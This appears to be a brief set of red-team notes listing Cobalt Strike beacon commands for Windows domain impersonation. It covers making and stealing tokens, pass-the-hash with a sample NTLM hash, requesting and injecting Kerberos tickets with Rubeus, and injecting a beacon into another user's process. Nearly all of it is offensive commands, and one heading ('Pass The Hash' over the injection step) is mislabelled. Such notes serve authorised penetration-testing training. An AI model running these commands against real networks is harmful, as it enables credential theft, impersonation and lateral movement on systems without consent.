### 🛠️ 1. **Make Token (using password)**

> If used without a password, it only makes you appear as that user at the network level (e.g., for pass-the-ticket, you also need to appear as the user on the network).

```powershell
beacon> make_token CONTOSO\rsteel Passw0rd!

beacon> rev2self
```

### 🕵️ 2. **Steal Token (from another user's process)**

>**Steals an active token** from a process already started by another account.
> **Requires high integrity** (ADMIN/SYSTEM).

```powershell
beacon> ps

beacon> steal_token ID

beacon> rev2self
```

###  3. **Pass The Hash**

```powershell
beacon> pth CONTOSO\rsteel fc525c9683e8fe067095ba2ddc971889
```

###  4. **Pass The Ticket**

### 🎫 **Requesting TGTs**

- If you have the NTLM hash or AES key of a user, you can legitimately request their TGT.
- ⚠️ Using the NTLM hash returns RC4 tickets → not recommended
- ✅ Prefer using the AES256 key (more secure).

```powershell
beacon> execute-assembly C:\Tools\Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /aes256:<clave> /nowrap
```

🧪 **Injecting TGTs into sessions**


```powershell
beacon> make_token CONTOSO\rsteel FakePass

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\notepad.exe /username:rsteel /domain:CONTOSO.COM /password:FakePass /ticket:[TGT]

beacon> steal_token PID
```

4. To purge tickets:

```powershell
beacon> kerberos_ticket_purge
beacon> rev2self
```


###  5. **Pass The Hash**

> List processes with ps, and if you see a process running as another user, inject the beacon into it.

```powershell
beacon> ps #**process_browser** if you want with GUI
beacon> inject ID x64 http
```
